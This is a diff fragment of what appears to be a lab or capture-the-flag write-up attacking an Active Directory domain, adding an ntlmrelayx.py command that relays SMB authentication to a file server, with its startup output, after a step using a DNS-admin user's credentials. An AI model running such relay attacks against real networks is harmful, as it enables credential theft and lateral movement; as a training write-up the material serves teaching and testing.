@@ -969,5 +969,38 @@ bloodyAD --host dc.novaforge.local -d novaforge.local -u daniel.brooks -p 'Passw
 First ill add the DNS record using `daniel.brooks` creds since he is a dns admin
 
 ```python
+ntlmrelayx.py -smb2support -t smb://storage.novaforge.local
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client RPC loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RPC Server on port 135
+[*] Setting up MSSQL Server on port 1433
+[*] Setting up RDP Server on port 3389
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+```
+
+Ill then set up ntlm relay to relay the authentication
+
+```python
 
 ```
